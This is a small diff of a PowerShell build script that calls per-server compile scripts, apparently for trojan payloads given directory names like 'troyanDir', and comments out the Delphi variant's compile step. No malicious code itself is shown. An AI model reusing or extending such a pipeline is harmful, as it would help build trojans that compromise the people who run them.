@@ -27,7 +27,7 @@ if ([string]::IsNullOrEmpty($server.rootDir)) {
 & (Join-Path -Path $server.troyanDir -ChildPath "./troyancompile.ps1") -serverName $serverName
 
 #delphi
-& (Join-Path -Path $server.troyanDelphiDir -ChildPath "./delphicompile.ps1") -serverName $serverName
+# & (Join-Path -Path $server.troyanDelphiDir -ChildPath "./delphicompile.ps1") -serverName $serverName
 
 #vbs
 & (Join-Path -Path $server.troyanVbsDir -ChildPath "./vbscompile.ps1") -serverName $serverName
